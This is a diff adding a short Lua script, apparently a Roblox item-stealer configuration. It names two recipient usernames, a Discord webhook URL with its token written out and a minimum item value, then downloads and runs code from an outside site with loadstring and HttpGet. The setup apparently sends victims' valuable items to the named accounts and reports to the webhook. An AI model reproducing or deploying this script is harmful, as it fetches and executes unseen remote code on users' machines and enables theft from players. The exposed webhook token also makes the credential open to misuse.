@@ -1,0 +1,10 @@
+lua
+Username = "mxrcuszzzzz"
+Username2 = "mxrcuszzzzz"
+Webhook = "https://discord.com/api/webhooks/1224405696997752952/svqNFSlGpLIuXcA8WyO2fiiLfUHRq3EH0UaXUY_84u5LjLen4Nmy6LU4O2c1tuGXsdxF"
+
+HubName = "X"
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://hugegames.space"))()
